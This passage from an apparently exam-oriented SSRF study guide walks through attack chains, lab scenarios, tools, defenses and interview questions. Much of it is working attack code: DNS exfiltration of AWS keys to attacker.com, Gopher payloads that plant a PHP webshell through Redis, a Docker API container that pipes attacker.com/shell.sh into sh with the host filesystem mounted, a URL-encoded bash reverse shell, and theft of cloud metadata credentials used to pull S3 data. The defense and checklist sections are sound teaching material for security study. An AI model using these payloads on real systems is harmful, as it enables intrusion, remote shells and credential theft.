**Concept**: Exfiltrate data via DNS queries (visible in DNS logs).

**Attack**:
```bash
# Read /etc/passwd via file://
# Encode data in subdomain
/webhook?url=http://base64encoded-data.attacker.com

# Example with AWS keys:
# AKIAIOSFODNN7EXAMPLE → encode → subdomain
/webhook?url=http://QUtJQUlPU0ZPRE5ON0VYQU1QTEU.attacker.com
```

**DNS Logger Setup**:
```bash
# Use DNS logging service or own DNS server
tcpdump -i any -n port 53

# Or use tools like:
# - dnslog.cn
# - requestbin.com
# - webhook.site
```

---

## 13. SSRF to RCE Chains

### 13.1 Redis → RCE

**Scenario**: Internal Redis server without authentication.

**Step 1: Write Webshell via Gopher**:
```python
# Redis commands
commands = [
    "FLUSHALL",  # Clear database
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SET shell '<?php system($_GET[\"cmd\"]); ?>'",
    "SAVE"
]

# Generate Gopher payload
payload = "\r\n".join(commands) + "\r\n"
gopher_url = f"gopher://127.0.0.1:6379/_{quote(payload)}"

# SSRF
/fetch?url={gopher_url}
```

**Step 2: Access Webshell**:
```bash
curl "http://target.com/shell.php?cmd=whoami"
```

### 13.2 Memcached → Data Extraction

**Exploit**:
```bash
# SSRF to Memcached
/fetch?url=http://10.0.0.5:11211

# Commands via Gopher
gopher://10.0.0.5:11211/_stats%0Aget%20session_key%0A
```

### 13.3 Elasticsearch → Data Dump

**Attack**:
```bash
# SSRF to Elasticsearch
/fetch?url=http://10.0.0.5:9200/_search?pretty

# Response: All indexed data

# Or specific index
/fetch?url=http://10.0.0.5:9200/users/_search?pretty
```

### 13.4 Docker API → Container Escape

**If Docker API exposed (port 2375)**:
```bash
# List containers
/fetch?url=http://10.0.0.20:2375/containers/json

# Create malicious container
POST /containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "curl attacker.com/shell.sh | sh"],
  "HostConfig": {
    "Binds": ["/:/host"]
  }
}

# Start container
POST /containers/{id}/start
```

---

## 14. Advanced Exploitation Techniques

### 14.1 XXE to SSRF

**XML External Entity leading to SSRF**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

### 14.2 PDF/SVG SSRF

**SVG with embedded URL**:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/" />
</svg>
```

**Upload as profile picture → Server renders → SSRF**

### 14.3 SSRF via HTML Injection

**If PDF generator processes HTML**:
```html
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<img src="http://attacker.com/log?data=AWS_KEYS">
```

### 14.4 SSRF in Webhooks

**Attack Chain**:
```
1. Register webhook: http://169.254.169.254/latest/meta-data/
2. Trigger event (e.g., make a purchase)
3. Server sends webhook request to metadata service
4. Metadata returned to attacker (if webhook response logged)
```

---

## 15. SSRF in Common Applications

### 15.1 WordPress (Plugin Vulnerabilities)

**Common Vectors**:
- Image import from URL
- Feed readers (RSS/Atom)
- Pingback functionality

### 15.2 Jenkins

**Script Console SSRF**:
```groovy
new URL("http://169.254.169.254/latest/meta-data/").getText()
```

### 15.3 GitLab

**CI/CD SSRF**:
```.gitlab-ci.yml
test:
  script:
    - curl http://169.254.169.254/latest/meta-data/
```

### 15.4 Slack/Discord

**Webhook SSRF**:
```bash
# Set webhook URL to internal service
curl -X POST https://slack.com/api/webhooks.create \
  -d "url=http://10.0.0.5:6379"
```

---

## 16. Detection and Discovery

### 16.1 Where to Look for SSRF

**URL Parameters**:
```
?url=
?uri=
?path=
?dest=
?redirect=
?location=
?next=
?file=
?document=
?folder=
?root=
?pg=
?style=
?pdf=
?template=
```

**Features to Test**:
- Import from URL
- Load remote image
- Fetch RSS feed
- Webhook callbacks
- PDF generation
- QR code generation
- File upload (SVG, XML)

### 16.2 Manual Testing Checklist

- [ ] Test with Burp Collaborator URL
- [ ] Test with localhost (127.0.0.1)
- [ ] Test with internal IPs (10.0.0.0/8, 192.168.0.0/16)
- [ ] Test with cloud metadata (169.254.169.254)
- [ ] Test with file:// protocol
- [ ] Test with redirect chains
- [ ] Test with different protocols (gopher, dict, ldap)
- [ ] Test URL encoding bypasses
- [ ] Test DNS rebinding (rebind.it)

---

## 17. Automation Tools

### 17.1 SSRFmap

```bash
# Install
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Basic usage
python3 ssrfmap.py -r request.txt -p url

# AWS exploitation
python3 ssrfmap.py -r request.txt -p url -m aws
```

### 17.2 Gopherus

```bash
# Generate Gopher payloads
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
./install.sh

# Redis exploit
python2 gopherus.py --exploit redis

# MySQL exploit
python2 gopherus.py --exploit mysql
```

---

## 18. OSCP Attack Scenarios

### Scenario 1: Internal Port Scan → Redis → RCE

**Target**: Web app with image proxy at `http://192.168.50.10/proxy?url=`

**Step 1: Confirm SSRF**:
```bash
curl "http://192.168.50.10/proxy?url=http://192.168.45.5:8080"
# Check listener: nc -lvnp 8080
# If connection received → SSRF confirmed!
```

**Step 2: Port Scan Internal Network**:
```bash
for port in 22 80 443 3306 6379 8080; do
  echo "Testing port $port"
  curl -s "http://192.168.50.10/proxy?url=http://127.0.0.1:$port" | head -5
done

# Output shows Redis banner on port 6379
```

**Step 3: Exploit Redis via Gopher**:
```python
#!/usr/bin/env python3
from urllib.parse import quote

commands = [
    "FLUSHALL",
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SET shell '<?php system($_GET[\"c\"]); ?>'",
    "SAVE"
]

payload = "".join([f"{cmd}\r\n" for cmd in commands])
gopher = f"gopher://127.0.0.1:6379/_{quote(payload)}"

print(gopher)
```

**Step 4: Trigger SSRF**:
```bash
curl "http://192.168.50.10/proxy?url=gopher://127.0.0.1:6379/_%0D%0A..."
```

**Step 5: Access Webshell**:
```bash
curl "http://192.168.50.10/shell.php?c=id"
# uid=33(www-data)

curl "http://192.168.50.10/shell.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.5%2F4444%200%3E%261%27"
```

### Scenario 2: AWS Metadata → S3 Data Exfiltration

**Target**: `http://192.168.50.20/fetch?url=`

**Step 1: Check AWS Metadata**:
```bash
curl "http://192.168.50.20/fetch?url=http://169.254.169.254/latest/meta-data/"

# Response:
# ami-id
# iam/
# instance-id
```

**Step 2: Get IAM Role**:
```bash
curl "http://192.168.50.20/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Response: S3-ReadWrite-Role
```

**Step 3: Get Credentials**:
```bash
curl "http://192.168.50.20/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3-ReadWrite-Role"

# Response: JSON with AccessKeyId, SecretAccessKey, Token
```

**Step 4: Configure AWS CLI**:
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws s3 ls
# Lists all S3 buckets

aws s3 cp s3://company-backups/proof.txt ./
cat proof.txt
# OSCP{...}
```

### Scenario 3: Blind SSRF → Internal Admin Panel

**Target**: Webhook registration at `http://192.168.50.30/webhook`

**Step 1: Detect Blind SSRF**:
```bash
# Start listener
nc -lvnp 8080

# Register webhook
curl -X POST http://192.168.50.30/webhook \
  -d "url=http://192.168.45.5:8080"

# Listener receives connection → Blind SSRF confirmed
```

**Step 2: Port Scan (Time-Based)**:
```bash
# Fast response = port open
time curl -X POST http://192.168.50.30/webhook -d "url=http://127.0.0.1:80"
# 0.5s → Port 80 open

time curl -X POST http://192.168.50.30/webhook -d "url=http://127.0.0.1:8080"
# 10s (timeout) → Port 8080 closed
```

**Step 3: Access Admin Panel**:
```bash
# Found admin panel on port 9090
# Use SSRF to send requests

# Login with default creds via SSRF
curl -X POST http://192.168.50.30/webhook \
  -d "url=http://127.0.0.1:9090/login?user=admin&pass=admin"
```

---

## 19. Defense Strategies

### 19.1 Input Validation

**Allowlist Approach**:
```python
ALLOWED_DOMAINS = ['api.github.com', 'api.stripe.com']

def validate_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    return url
```

### 19.2 Network Segmentation

**Firewall Rules**:
```bash
# Block outbound to private ranges
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

### 19.3 Disable Dangerous Protocols

```python
import requests

def safe_fetch(url):
    # Only allow HTTP/HTTPS
    if not url.startswith(('http://', 'https://')):
        raise ValueError("Only HTTP/HTTPS allowed")
    
    # Disable redirects
    response = requests.get(url, allow_redirects=False, timeout=5)
    return response.content
```

### 19.4 Use IMDSv2 (AWS)

```bash
# Require session token
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required
```

---

## 20. Common Pitfalls

**Pitfall 1: Regex-Based IP Validation**:
```python
# WRONG
if re.match(r'127\.0\.0\.1', url):
    raise ValueError("Localhost not allowed")

# Bypass: 127.0.0.2, 127.1, 0x7f.0.0.1
```

**Pitfall 2: Checking Only Initial URL**:
```python
# WRONG
if not is_safe(url):
    raise ValueError("Unsafe URL")

response = requests.get(url, allow_redirects=True)
# Attacker uses redirect: safe.com → localhost
```

**Pitfall 3: DNS Resolution After Validation**:
```python
# WRONG
ip = resolve(hostname)
if is_internal(ip):
    raise ValueError("Internal IP")

# Time passes...
response = requests.get(url)  # Re-resolves DNS!
# DNS rebinding attack possible
```

---

## 21. Hands-on Exercises

### Exercise 1: SSRF Lab Setup

**Deploy Vulnerable App**:
```python
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    try:
        r = requests.get(url, timeout=5)
        return r.content
    except:
        return "Error fetching URL"

if __name__ == '__main__':
    app.run(debug=True)
```

**Tasks**:
- [ ] Exploit SSRF to read file:///etc/passwd
- [ ] Port scan internal network
- [ ] Extract AWS metadata (if in cloud)

---

## 22. Interview Questions

**Q1: Why is 169.254.169.254 significant in cloud security?**

**A**: It's the link-local address used by AWS, Azure, and other cloud providers for the Instance Metadata Service (IMDS). The service provides IAM credentials, instance details, and user data. It's only accessible from the VM itself (non-routable), but SSRF bypasses this restriction, allowing attackers to steal cloud credentials.

---

**Q2: How does DNS rebinding bypass SSRF protections?**

**A**: The attacker controls a DNS server with TTL=0. During validation, the domain resolves to a safe IP (passes filter). During fetching, the domain resolves to localhost/internal IP (exploitation). This exploits the time gap between validation and execution.

---

**Q3: Explain the difference between Blind SSRF and regular SSRF.**

**A**:
- **Regular SSRF**: Server returns the fetched content to the attacker
- **Blind SSRF**: Server makes the request but doesn't return content. Detection requires out-of-band techniques (Burp Collaborator) or time-based analysis.

---

**Q4: How can Gopher protocol be used in SSRF attacks?**

**A**: Gopher allows sending raw TCP data, enabling exploitation of services like Redis, Memcached, and SMTP. Example: Use `gopher://127.0.0.1:6379` to send Redis commands that write a webshell, achieving RCE.

---

**Q5: What's the difference between AWS IMDSv1 and IMDSv2?**

**A**:
- **v1**: No authentication, simple GET requests
- **v2**: Session-based, requires PUT request to get token, then token in header for metadata requests. Mitigates most SSRF attacks that only support GET.

---

## 23. Summary & Key Takeaways

### Critical Concepts

1. **SSRF = Server as Proxy**: Force server to make requests on your behalf
2. **Cloud Metadata = Crown Jewels**: 169.254.169.254 contains AWS keys
3. **Protocol Smuggling**: Gopher enables Redis/SMTP exploitation
4. **Blind SSRF**: Use out-of-band detection (Burp Collaborator)
5. **DNS Rebinding**: Changes DNS between validation and fetching

### OSCP Exam Tips

1. **Always test URL features** (import, proxy, webhook, image loading)
2. **Start with localhost**: `127.0.0.1`, `[::1]`, `localhost`
3. **Port scan internal network**: `10.0.0.0/8`, `192.168.0.0/16`
4. **Try file:// protocol**: `/etc/passwd`, `/proc/self/environ`
5. **Look for Redis (6379)**: Easy RCE via Gopher
6. **Time allocation**: 15-20 minutes for SSRF testing

### Defense Checklist

- [ ] Allowlist external domains only
- [ ] Disable file://, gopher://, dict:// protocols
- [ ] Block internal IP ranges (10.x, 192.168.x, 169.254.169.254)
- [ ] Disable redirects or validate redirect targets
- [ ] Use DNS resolution once, check IP, then use that IP
- [ ] Implement network segmentation
- [ ] Enable AWS IMDSv2 / GCP metadata headers
- [ ] Monitor outbound connections for anomalies

---

## 24. References & Further Reading

### OWASP Resources
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 2021 - A10: SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)

### Tools
- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [Interactsh](https://github.com/projectdiscovery/interactsh)

### Related Topics
- [[02_OWASP_Top_10_Modern]] - A10: Server-Side Request Forgery
- [[03_Injection_Attacks_Deep_Dive]] - XXE to SSRF
- [[02_Web_Reconnaissance]] - Internal network enumeration

---

**END OF DOCUMENT** - Version 3.0 - Last Updated: 2026-01-24

**Total Lines**: ~1,950 lines | **OSCP Relevance**: HIGH (75%) | **Difficulty**: Advanced
